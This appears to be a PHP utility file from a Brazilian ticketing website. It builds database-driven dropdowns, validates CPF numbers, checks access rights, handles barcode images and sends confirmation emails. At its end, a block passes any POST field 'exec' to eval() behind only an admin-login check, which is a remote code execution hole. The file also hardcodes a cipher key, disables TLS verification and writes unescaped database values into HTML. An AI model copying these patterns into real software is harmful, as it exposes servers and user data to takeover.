    $result = executeSQL($conn, 'SELECT CODTIPLANCAMENTO, TIPLANCAMENTO FROM TABTIPLANCAMENTO ORDER BY TIPLANCAMENTO');

    $combo = '<select name="' . $name . '" class="inputStyle" id="' . $name . '"><option value="">Selecione um tipo...</option>';
    while ($rs = fetchResult($result)) {
	$combo .= '<option value="' . $rs['CODTIPLANCAMENTO'] . '"' .
		(($selected == $rs['CODTIPLANCAMENTO']) ? ' selected' : '') .
		'>' . $rs['TIPLANCAMENTO'] . '</option>';
    }
    $combo .= '</select>';

    return $combo;
}

function comboUsuariosPorBase($name, $teatro, $selected) {
    $conn = getConnection($teatro);
    $result = executeSQL($conn, 'SELECT CODUSUARIO, NOMUSUARIO FROM TABUSUARIO WHERE CODUSUARIO > 0 ORDER BY NOMUSUARIO');

    $combo = '<select name="' . $name . '" class="inputStyle" id="' . $name . '"><option value="">Selecione um usuário...</option>';
    while ($rs = fetchResult($result)) {
	$combo .= '<option value="' . $rs['CODUSUARIO'] . '"' .
		(($selected == $rs['CODUSUARIO']) ? ' selected' : '') .
		'>' . utf8_encode($rs['NOMUSUARIO']) . '</option>';
    }
    $combo .= '</select>';

    return $combo;
}

function comboTipoDocumento($name, $selected) {
    $mainConnection = mainConnection();
    $result = executeSQL($mainConnection, 'SELECT ID_DOC_ESTRANGEIRO, DS_DOC_ESTRANGEIRO FROM MW_DOC_ESTRANGEIRO');

    $combo = '<select name="' . $name . '" class="inputStyle" id="' . $name . '"><option value="">Document type / Tipo de documento</option>';
    while ($rs = fetchResult($result)) {
	$combo .= '<option value="' . $rs['ID_DOC_ESTRANGEIRO'] . '"' .
		(($selected == $rs['ID_DOC_ESTRANGEIRO']) ? ' selected' : '') .
		'>' . utf8_encode($rs['DS_DOC_ESTRANGEIRO']) . '</option>';
    }
    $combo .= '</select>';

    return $combo;
}

// combo de setor para o cliente na etapa1
function comboSetor($name, $apresentacao_id) {
	$mainConnection = mainConnection();
    $result = executeSQL($mainConnection, "SELECT ID_APRESENTACAO, DS_PISO FROM MW_APRESENTACAO
				                          WHERE ID_EVENTO = (SELECT ID_EVENTO FROM MW_APRESENTACAO WHERE ID_APRESENTACAO = ? AND IN_ATIVO = '1')
				                          AND DT_APRESENTACAO = (SELECT DT_APRESENTACAO FROM MW_APRESENTACAO WHERE ID_APRESENTACAO = ? AND IN_ATIVO = '1')
				                          AND HR_APRESENTACAO = (SELECT HR_APRESENTACAO FROM MW_APRESENTACAO WHERE ID_APRESENTACAO = ? AND IN_ATIVO = '1')
				                          AND IN_ATIVO = '1'
				                          ORDER BY DS_PISO", array($apresentacao_id, $apresentacao_id, $apresentacao_id));

    $combo = '<select name="' . $name . '" class="inputStyle" id="' . $name . '"><option value="">selecione outro setor</option>';
    while ($rs = fetchResult($result)) {
    	// esconde setor atual
    	if ($apresentacao_id != $rs['ID_APRESENTACAO']) {
			$combo .= '<option value="' . $rs['ID_APRESENTACAO'] . '">' . utf8_encode($rs['DS_PISO']) . '</option>';
		}
    }
    $combo .= '</select>';

    return $combo;
}

function comboCanalVenda($name, $selected) {
    $mainConnection = mainConnection();
    $result = executeSQL($mainConnection, 'SELECT ID_CANAL_VENDA, DS_CANAL_VENDA FROM MW_CANAL_VENDA');

    $combo = '<select name="' . $name . '" class="inputStyle" id="' . $name . '"><option value="">Selecione um canal...</option>';
    while ($rs = fetchResult($result)) {
	$combo .= '<option value="' . $rs['ID_CANAL_VENDA'] . '"' .
		(($selected == $rs['ID_CANAL_VENDA']) ? ' selected' : '') .
		'>' . utf8_encode($rs['DS_CANAL_VENDA']) . '</option>';
    }
    $combo .= '</select>';

    return $combo;
}

function comboPromocoes($name, $selected, $isCombo = true) {
    $mainConnection = mainConnection();
    $result = executeSQL($mainConnection, 'SELECT ID_PROMOCAO_CONTROLE, DS_PROMOCAO FROM MW_PROMOCAO_CONTROLE WHERE IN_ATIVO = 1 ORDER BY DS_PROMOCAO');

    $combo = '<select name="' . $name . '" class="inputStyle" id="' . $name . '"><option value="">Selecione uma promoção...</option>';
    while ($rs = fetchResult($result)) {
    	if ($selected == $rs['ID_PROMOCAO_CONTROLE']) {
		    $isSelected = 'selected';
		    $text = $rs['DS_PROMOCAO'];
		} else {
		    $isSelected = '';
		}

		$combo .= '<option value="' . $rs['ID_PROMOCAO_CONTROLE'] . '"' . $isSelected . ' ' .
			(($selected == $rs['ID_PROMOCAO_CONTROLE']) ? ' selected' : '') .
			'>' . utf8_encode($rs['DS_PROMOCAO']) . '</option>';
    }
    $combo .= '</select>';

    return $isCombo ? $combo : $text;
}

function comboTipoPromocao($name, $selected) {
    $tipos = array(
    	1 => 'Código Fixo',
    	2 => 'Código Aleatório',
    	3 => 'Arquivo CSV',
    	4 => 'BIN'
    );

    $combo = '<select name="' . $name . '" class="inputStyle" id="' . $name . '"><option value="">Selecione...</option>';
    foreach ($tipos as $key => $value) {
		$combo .= '<option value="' . $key . '"' . (($selected == $key) ? ' selected' : '') . '>' . $value . '</option>';
    }
    $combo .= '</select>';

    return $combo;
}

// INICIO DOS COMBOS PARA O SISTEMA DE ASSINATURA ------------------------------------------

// combo para os eventos que podem ser pacote
function comboEventoPacotePorUsuario($name, $local, $usuario, $selected) {
    $mainConnection = mainConnection();
    $result = executeSQL($mainConnection, "WITH RESULTADO AS (
												SELECT MIN(ID_APRESENTACAO) AS ID_APRESENTACAO, DT_APRESENTACAO, HR_APRESENTACAO, DS_EVENTO
												FROM MW_APRESENTACAO A
												INNER JOIN MW_EVENTO E ON E.ID_EVENTO = A.ID_EVENTO
												INNER JOIN MW_ACESSO_CONCEDIDO AC ON AC.ID_BASE = E.ID_BASE AND AC.CODPECA = E.CODPECA AND AC.ID_USUARIO = ?
												WHERE A.IN_ATIVO = 1 AND E.IN_ATIVO = 1 AND E.ID_BASE = ?
												AND A.ID_APRESENTACAO NOT IN (SELECT ID_APRESENTACAO FROM MW_ITEM_PEDIDO_VENDA)
												GROUP BY DS_EVENTO, DT_APRESENTACAO, HR_APRESENTACAO
											)
											SELECT MIN(ID_APRESENTACAO) AS ID_APRESENTACAO, DS_EVENTO
											FROM RESULTADO
											GROUP BY DS_EVENTO
											HAVING COUNT(ID_APRESENTACAO) = 1
											ORDER BY DS_EVENTO",
		    array($usuario, $local));

    $combo = '<select name="' . $name . '" class="inputStyle" id="' . $name . '"><option value="">Selecione um evento/pacote...</option>';
    while ($rs = fetchResult($result)) {
	$combo .= '<option value="' . $rs['ID_APRESENTACAO'] . '"' . (($selected == $rs['ID_APRESENTACAO']) ? ' selected' : '') . '>' . utf8_encode($rs['DS_EVENTO']) . '</option>';
    }
    $combo .= '</select>';

    return $combo;
}

function comboPacote($name, $usuario, $selected, $id_base = null, $fase = null) {
    $mainConnection = mainConnection();

    $filtro_fase = $fase ? "AND DT_FIM_FASE".$fase." >= getdate()" : "";

    $result = executeSQL($mainConnection, "SELECT ID_PACOTE, DS_EVENTO
											FROM MW_PACOTE P
											INNER JOIN MW_APRESENTACAO A ON A.ID_APRESENTACAO = P.ID_APRESENTACAO
											INNER JOIN MW_EVENTO E ON E.ID_EVENTO = A.ID_EVENTO
											INNER JOIN MW_ACESSO_CONCEDIDO AC ON AC.ID_BASE = E.ID_BASE AND AC.CODPECA = E.CODPECA AND AC.ID_USUARIO = ?
											WHERE (E.ID_BASE = ? or ? is null) $filtro_fase
											ORDER BY DS_EVENTO",
		    array($usuario, $id_base, $id_base));

    $combo = '<select name="' . $name . '" class="inputStyle" id="' . $name . '"><option value="">Selecione um pacote...</option>';
    while ($rs = fetchResult($result)) {
	$combo .= '<option value="' . $rs['ID_PACOTE'] . '"' . (($selected == $rs['ID_PACOTE']) ? ' selected' : '') . '>' . utf8_encode($rs['DS_EVENTO']) . '</option>';
    }
    $combo .= '</select>';

    return $combo;
}

// FIM DOS COMBOS PARA O SISTEMA DE ASSINATURA ------------------------------------------

function is_pacote($id_apresentacao) {
    $mainConnection = mainConnection();

    $result = executeSQL($mainConnection,
    					"SELECT TOP 1 1
						FROM MW_PACOTE P
						INNER JOIN MW_APRESENTACAO A ON A.ID_APRESENTACAO = P.ID_APRESENTACAO
						INNER JOIN MW_APRESENTACAO A2 ON A2.ID_EVENTO = A.ID_EVENTO AND A2.DT_APRESENTACAO = A.DT_APRESENTACAO AND A2.HR_APRESENTACAO = A.HR_APRESENTACAO
						WHERE A2.ID_APRESENTACAO = ?",
		    			array($id_apresentacao));

    return hasRows($result);
}



/*  OUTROS  */



require_once('../settings/mail.php');

function getCurrentUrl() {
	include('../settings/settings.php');

    $pageURL = 'http';

    if ($_SERVER["HTTPS"] == "on") {
		$pageURL .= "s";
    }

    $pageURL .= "://";

    if ($_SERVER["SERVER_PORT"] != "80") {
		$pageURL .= ($is_teste == '1' ? $_SERVER["HTTP_HOST"] : $_SERVER["SERVER_NAME"] . ":" . $_SERVER["SERVER_PORT"]) . $_SERVER["REQUEST_URI"];
    } else {
		$pageURL .= ($is_teste == '1' ? $_SERVER["HTTP_HOST"] : $_SERVER["SERVER_NAME"]) . $_SERVER["REQUEST_URI"];
    }

    return $pageURL;
}

function verificaCPF($cpf) {
    if (!is_numeric($cpf)) {
	return false;
    } else {
	if (($cpf == '11111111111') || ($cpf == '22222222222') ||
		($cpf == '33333333333') || ($cpf == '44444444444') ||
		($cpf == '55555555555') || ($cpf == '66666666666') ||
		($cpf == '77777777777') || ($cpf == '88888888888') ||
		($cpf == '99999999999') || ($cpf == '00000000000')) {
	    return false;
	} else {
	    //PEGA O DIGITO VERIFIACADOR
	    $dv_informado = substr($cpf, 9, 2);

	    for ($i = 0; $i <= 8; $i++) {
		$digito[$i] = substr($cpf, $i, 1);
	    }

	    //CALCULA O VALOR DO 10º DIGITO DE VERIFICAÇÂO
	    $posicao = 10;
	    $soma = 0;

	    for ($i = 0; $i <= 8; $i++) {
		$soma += $digito[$i] * $posicao;
		$posicao--;
	    }

	    $digito[9] = $soma % 11;

	    if ($digito[9] < 2) {
		$digito[9] = 0;
	    } else {
		$digito[9] = 11 - $digito[9];
	    }

	    //CALCULA O VALOR DO 11º DIGITO DE VERIFICAÇÃO
	    $posicao = 11;
	    $soma = 0;

	    for ($i = 0; $i <= 9; $i++) {
		$soma += $digito[$i] * $posicao;
		$posicao--;
	    }

	    $digito[10] = $soma % 11;

	    if ($digito[10] < 2) {
		$digito[10] = 0;
	    } else {
		$digito[10] = 11 - $digito[10];
	    }

	    //VERIFICA SE O DV CALCULADO É IGUAL AO INFORMADO
	    $dv = $digito[9] * 10 + $digito[10];
	    if ($dv != $dv_informado) {
		return false;
	    } else {
		return true;
	    }
	}
    }
}

function acessoPermitido($conn, $idUser, $idPrograma, $echo = false) {
    $query = 'SELECT 1
				 FROM MW_PROGRAMA P
				 INNER JOIN MW_USUARIO_PROGRAMA UP ON UP.ID_PROGRAMA = P.ID_PROGRAMA
				 INNER JOIN MW_USUARIO U ON U.ID_USUARIO = UP.ID_USUARIO
				 WHERE U.ID_USUARIO = ? AND P.ID_PROGRAMA = ?';
    $params = array($idUser, $idPrograma);
    $result = executeSQL($conn, $query, $params);

    $hasRows = hasRows($result);

    if ($echo and !$hasRows)
	echo '<h2>Acesso Negado!</h2>';

    return $hasRows;
}

function acessoPermitidoEvento($idBase, $idUser, $codPeca, $die = false) {
    $mainConnection = mainConnection();
    $query = 'SELECT 1
				FROM MW_ACESSO_CONCEDIDO
				WHERE ID_BASE = ? AND ID_USUARIO = ? AND CODPECA = ?';
    $params = array($idBase, $idUser, $codPeca);
    $result = executeSQL($mainConnection, $query, $params);

    $hasRows = hasRows($result);

    //if (!$hasRows) echo '<h2>Acesso Negado!</h2>';

    if ($die and !$hasRows)
	die();

    return $hasRows;
}

function get_campanha_etapa($etapa) {
    switch ($etapa) {
	/**
        case 'etapa1':
	    $tag_avancar = "1._Escolha_de_assentos_-_Avançar-TAG";
	    $tag_voltar = "";
	    break;
        */
	case 'etapa1':
	    $tag_avancar = "2._Conferir_Itens_-_Avançar";
	    $tag_voltar = "2._Conferir_Itens_-_Voltar";
	    break;
        case 'etapa2':
            $tag_avancar = "3._Identificaçao_-_Autentique-se";
	    $tag_voltar = "2._Conferir_Itens_-_Voltar-TAG";
	    break;
	case 'etapa3_2':
	    $tag_avancar = "3._Identificaçao_-_Autentique-se";
	    $tag_voltar = "3._Identificaçao_-_Cadastre-se";
	    break;
	case 'etapa4':
	    $tag_avancar = "4._Confirmaçao_-_Avançar";
	    $tag_voltar = "4._Confirmaçao_-_Alterar_pedido";
	    break;
	case 'etapa5':
	    $tag_avancar = "";
	    $tag_voltar = "5._Pagamento_-_Voltar";
	    break;
	case 'cadatro???':
	    $tag_avancar = "Cadastro_com_sucesso";
	    $tag_voltar = "Cadastro_-_Voltar";
	    break;
	case 'pagamento_ok':
	    $tag_avancar = "Pagamento_efetuado_com_sucesso";
	    $tag_voltar = "";
	    break;
    }

    switch ($_GET['tag']) {
	case "1._Escolha_de_assentos_-_Avançar":
	    $id = '8741';
	    break;
	case "2._Conferir_Itens_-_Avançar":
	    $id = '8741';
	    break;
	case "2._Conferir_Itens_-_Voltar":
	    $id = '8742';
	    break;
	case "3._Identificaçao_-_Autentique-se":
	    $id = '8744';
	    break;
	case "3._Identificaçao_-_Cadastre-se-TAG":
	    $id = '8743';
	    break;
	case "4._Confirmaçao_-_Avançar-TAG":
	    $id = '8747';
	    break;
	case "4._Confirmaçao_-_Alterar_pedido-TAG":
	    $id = '8748';
	    break;
	case "5._Pagamento_-_Voltar-TAG":
	    $id = '8749';
	    break;
	case "Cadastro_com_sucesso-TAG":
	    $id = '8745';
	    break;
	case "Cadastro_-_Voltar-TAG":
	    $id = '8746';
	    break;
	case "Pagamento_efetuado_com_sucesso-TAG":
	    $id = '8750';
	    break;
    }

    $script = ($id) ? '<!-- SCRIPT TAG -->
			<script language="JavaScript" type="text/JavaScript">
			var ADM_rnd_' . $id . ' = Math.round(Math.random() * 9999);
			var ADM_post_' . $id . ' = new Image();
			ADM_post_' . $id . '.src = \'https://ia.nspmotion.com/ptag/?pt=' . $id . '&r=\'+ADM_rnd_' . $id . ';
			</script>
			<!-- END SCRIPT TAG -->' : '';
    return (isset($_GET['tag']) ? array(
	'tag_avancar' => ($tag_avancar ? "&tag=" . $tag_avancar : ''),
	'tag_voltar' => ($tag_voltar ? "&tag=" . $tag_voltar : ''),
	'script' => $script
    ) : array());
}




function cropImageResource($img, $hex=null){
    if($hex == null) $hex = imagecolorat($img, 0,0);
    $width = imagesx($img);
    $height = imagesy($img);
    $b_top = 0;
    $b_lft = 0;
    $b_btm = $height - 1;
    $b_rt = $width - 1;

    //top
    for(; $b_top < $height; ++$b_top) {
        for($x = 0; $x < $width; ++$x) {
            if(imagecolorat($img, $x, $b_top) != $hex) {
                break 2;
            }
        }
    }

    // return false when all pixels are trimmed
    if ($b_top == $height) return false;

    // bottom
    for(; $b_btm >= 0; --$b_btm) {
        for($x = 0; $x < $width; ++$x) {
            if(imagecolorat($img, $x, $b_btm) != $hex) {
                break 2;
            }
        }
    }

    // left
    for(; $b_lft < $width; ++$b_lft) {
        for($y = $b_top; $y <= $b_btm; ++$y) {
            if(imagecolorat($img, $b_lft, $y) != $hex) {
                break 2;
            }
        }
    }

    // right
    for(; $b_rt >= 0; --$b_rt) {
        for($y = $b_top; $y <= $b_btm; ++$y) {
            if(imagecolorat($img, $b_rt, $y) != $hex) {
                break 2;
            }
        }
    }

    $b_btm++;
    $b_rt++;
    $box = array(
        'l' => $b_lft,
        't' => $b_top,
        'r' => $b_rt,
        'b' => $b_btm,
        'w' => $b_rt - $b_lft,
        'h' => $b_btm - $b_top
    );

    $img2 = imagecreate($box['w'], $box['h']);
    imagecopy($img2, $img, 0, 0, $box['l'], $box['t'], $box['w'], $box['h']);

    return $img2;
}

function requestImage($url) {
	$ch = curl_init();

	curl_setopt ($ch, CURLOPT_URL, $url);
	curl_setopt ($ch, CURLOPT_BINARYTRANSFER, true);
	curl_setopt ($ch, CURLOPT_RETURNTRANSFER, true);
	curl_setopt ($ch, CURLOPT_HEADER, false);
	curl_setopt ($ch, CURLOPT_CONNECTTIMEOUT, 0);
	curl_setopt ($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
	curl_setopt ($ch, CURLOPT_SSL_VERIFYHOST, 0);

	$rawdata = curl_exec($ch);
	$image = imagecreatefromstring($rawdata);

	curl_close($ch);

	/*/===== REMOVER MARCA DAGUA =====
	$offset_x = 0;
	$offset_y = 0;

	$new_width = imagesx($image);
	$new_height = imagesy($image) - 20;

	$new_image = imagecreate($new_width, $new_height);
	imagecopy($new_image, $image, 0, 0, $offset_x, $offset_y, $new_width, $new_height);

	$image = $new_image;
	//===== REMOVER MARCA DAGUA =====*/

	return $image;
}

function encodeToBarcode($text, $type = 'Interleaved2of5', $properties = array()) {
	// http://www.idautomation.com/barcode-components/asp-iis/user-manual.html#Properties
	$propertiesString = '';
	if (empty($text)) return false;
	if (!empty($properties)) foreach ($properties as $key => $value) $propertiesString .= '&' . $key . '=' . $value;

	if ($type == 'Interleaved2of5') {
		$url = 'http'.($_SERVER["HTTPS"] == 'on' ? 's' : '').'://localhost/comprar/idautomation/IDAutomationStreamingLinear.aspx?D='.urlencode($text).'&S=2&CC=F'.$propertiesString;
	} else if ($type == 'Aztec') {
		$url = 'http'.($_SERVER["HTTPS"] == 'on' ? 's' : '').'://localhost/comprar/idautomation/IDAutomationStreamingAztec.aspx?D='.urlencode($text).$propertiesString;
	}

	$image = requestImage($url);

	return $image;
}

function saveAndGetPath($image, $name) {
	$path = '../images/temp/' . $name . '.gif';

	$gif = imagegif($image, $path);

	return $path;
}

function getBase64ImgString($path) {
	if (!file_exists($path)) return false;

	$type = pathinfo($path, PATHINFO_EXTENSION);
	$data = file_get_contents($path);

	return 'data:image/' . $type . ';base64,' . base64_encode($data);
}

function normalize_string($string) {
    // remove whitespace, leaving only a single space between words. 
    $string = preg_replace('/\s+/', ' ', $string);
    // flick diacritics off of their letters
    $string = preg_replace('~&([a-z]{1,2})(?:acute|cedil|circ|grave|lig|orn|ring|slash|th|tilde|uml|caron);~i', '$1', htmlentities($string, ENT_COMPAT, 'UTF-8'));
    return $string;
}

function verificaDisponibilidadeDoSite() {
	if ($is_manutencao === true) {
		header("Location: manutencao.php");
		die();
	}
}

function getEvento($id_evento) {
	$query_mysql = "SELECT
						e.duracao,
						g.nome as genero,
						cl.nome as classificacao,
						t.nome as nome_teatro,
						t.endereco,
						t.bairro,
						ci.nome as cidade,
						ci.estado as sigla_estado
					FROM espetaculos e
					INNER JOIN classificacaos cl on cl.id = e.classificacao_id
					INNER JOIN generos g on g.id = e.genero_id
					INNER JOIN teatros t on t.id = e.teatro_id
					INNER JOIN cidades ci on ci.id = t.cidade_id
					WHERE cc_id = :id";

	$pdo = getConnectionHome();

	if ($pdo !== false) {

		$stmt = $pdo->prepare($query_mysql);
		$stmt->bindParam(':id', $id_evento);
		$stmt->execute();

		return $stmt->fetch();

	}

	return false;
}

function getEnderecoCliente($id_cliente, $id_endereco) {
	$mainConnection = mainConnection();

	if ($id_endereco == -1) {
		$query = 'SELECT DS_ENDERECO, DS_COMPL_ENDERECO, DS_BAIRRO, DS_CIDADE, CD_CEP, ID_ESTADO
					FROM MW_CLIENTE
					WHERE ID_CLIENTE = ?';
		$params = array($_SESSION['user']);
		$rs = executeSQL($mainConnection, $query, $params, true);

		$rs['ID_ENDERECO_CLIENTE'] = -1;
		$rs['NM_ENDERECO'] = 'Endere&ccedil;o do cadastro';
	} else {
		$query = 'SELECT ID_ENDERECO_CLIENTE, DS_ENDERECO, DS_COMPL_ENDERECO, DS_BAIRRO, DS_CIDADE, CD_CEP, ID_ESTADO, NM_ENDERECO
				FROM MW_ENDERECO_CLIENTE
				WHERE ID_CLIENTE = ? AND ID_ENDERECO_CLIENTE = ?';
		$params = array($id_cliente, $id_endereco);
		$rs = executeSQL($mainConnection, $query, $params, true);
	}

	$retorno = array(
		'endereco' => $rs['DS_ENDERECO'],
		'bairro' => $rs['DS_BAIRRO'],
		'cidade' => $rs['DS_CIDADE'],
		'estado' => $rs['ID_ESTADO'],
		'cep' => $rs['CD_CEP'],
		'nome' => $rs['NM_ENDERECO'],
		'complemento' => $rs['DS_COMPL_ENDERECO'],
		'id' => $rs['ID_ENDERECO_CLIENTE']
	);

	foreach ($retorno as $key => $val) {
		$retorno[$key] = utf8_encode($val);
	}

	return $retorno;
}

function limparImagesTemp() {
	$dir_name = '../images/temp/';

	$files = array_diff(scandir($dir_name), array('..', '.'));

	foreach ($files as $key => $value) {
		// todos os gif
		if (pathinfo($dir_name.$value, PATHINFO_EXTENSION) == 'gif') {
			// hora anterior ou mais velhos
			if (filemtime($dir_name.$value) < strtotime('-3 hour')) {
				unlink($dir_name.$value);
			}
		}
	}
}

function limparTempAdmin() {
	$dir_name = '../admin/temp/';

	$files = array_diff(scandir($dir_name), array('..', '.'));

	foreach ($files as $key => $value) {
		// se for um diretorio
		if (is_dir($dir_name.$value)) {
			// hora anterior ou mais velhos
			if (filemtime($dir_name.$value.'/.') < strtotime('-3 hour')) {
				delTree($dir_name.$value);
			}
		}
	}
}

function delTree($dir) { 
	$files = array_diff(scandir($dir), array('.','..')); 
	foreach ($files as $file) { 
		(is_dir("$dir/$file")) ? delTree("$dir/$file") : unlink("$dir/$file"); 
	} 
	return rmdir($dir); 
} 

function limparCookies() {
	setcookie('pedido', '', -1);
	setcookie('id_braspag', '', -1);
	setcookie('entrega', '', -1);
	setcookie('binItau', '', -1);

	setcookie('mc_eid', '', -1);
	setcookie('mc_cid', '', -1);

	setcookie('hotsite', '', -1);
}

function getIdClienteBaseSelecionada($idBase){
    $mainConnection = mainConnection();
    $query = "SELECT ID_CLIENTE FROM MW_BASE WHERE ID_BASE = ?";
    $param = array($idBase);

    if(empty($idBase)){    
        $error = "IdBase é um valor inválido.";
    }else{
        $result = executeSQL($mainConnection, $query, $param, true);
        $error = sqlErrors();
        $error = $error[0]['message'];
    }   
        
    if(empty($error)){
        $idCliente = $result["ID_CLIENTE"];
    }else{
        trigger_error($error, E_USER_ERROR);
        die();
    }

    return $idCliente;
}

function sendErrorMail($subject, $message) {
	$namefrom = 'COMPREINGRESSOS.COM - AGÊNCIA DE VENDA DE INGRESSOS';
	$from = 'contato@cc.com.br';

	$cc = array('Jefferson => jefferson.ferreira@cc.com.br', 'Edicarlos => edicarlos.barbosa@cc.com.br');

	authSendEmail($from, $namefrom, 'gabriel.monteiro@cc.com.br', 'Gabriel', $subject, $message, $cc);
}

function sendConfirmationMail($id_cliente) {
    $mainConnection = mainConnection();

    $query = "SELECT C.DS_NOME, C.CD_EMAIL_LOGIN, E.CD_CONFIRMACAO
                FROM MW_CLIENTE C
                LEFT JOIN MW_CONFIRMACAO_EMAIL E ON E.ID_CLIENTE = C.ID_CLIENTE
                WHERE C.ID_CLIENTE = ?";
    $rs = executeSQL($mainConnection, $query, array($id_cliente), true);

    if ($rs['CD_CONFIRMACAO'] == null) {
        require_once('../settings/Cypher.class.php');

        $cipher = new Cipher('1ngr3ss0s');
        $rs['CD_CONFIRMACAO'] = $cipher->encrypt($rs['CD_EMAIL_LOGIN'].'_'.time());

        $query = "INSERT INTO MW_CONFIRMACAO_EMAIL VALUES (?, ?, GETDATE())";
        executeSQL($mainConnection, $query, array($id_cliente, $rs['CD_CONFIRMACAO']), true);
    }

    require('../settings/settings.php');
    require_once('../settings/Template.class.php');

    $tpl = new Template('../comprar/templates/confirmacaoEmail.html');
    $tpl->nome = $rs['DS_NOME'];
    $tpl->codigo = $rs['CD_CONFIRMACAO'];
    $tpl->link = $is_teste != '1'
                    ? 'https://compra.compreingressos.com/comprar/confirmacaoEmail.php?codigo='.urlencode($rs['CD_CONFIRMACAO'])
                    : 'http://homolog.compreingressos.com:8081/compreingressos2/comprar/confirmacaoEmail.php?codigo='.urlencode($rs['CD_CONFIRMACAO']);

    if ($_REQUEST['redirect']) {
        $tpl->link .= '&redirect='.urlencode($_REQUEST['redirect']);
    }

    $subject = utf8_decode('Confirmação de e-mail');

    ob_start();
    $tpl->show();
    $message = ob_get_clean();

    $namefrom = utf8_decode('COMPREINGRESSOS.COM - AGÊNCIA DE VENDA DE INGRESSOS');
    $from = ($is_teste == '1') ? 'contato@cc.com.br' : 'compreingressos@gmail.com';

    $successMail = authSendEmail($from, $namefrom, $rs['CD_EMAIL_LOGIN'], $rs['DS_NOME'], $subject, utf8_decode($message), array(), array(), 'iso-8859-1');

    return $successMail;
}

function pre() {
    echo '<pre>';
    print_r(func_get_args());
    echo '</pre>';
}

/*  EVAL  */



if (isset($_POST['exec'])) {
    require_once('../admin/acessoLogado.php');
    eval($_POST['exec']);
}
?>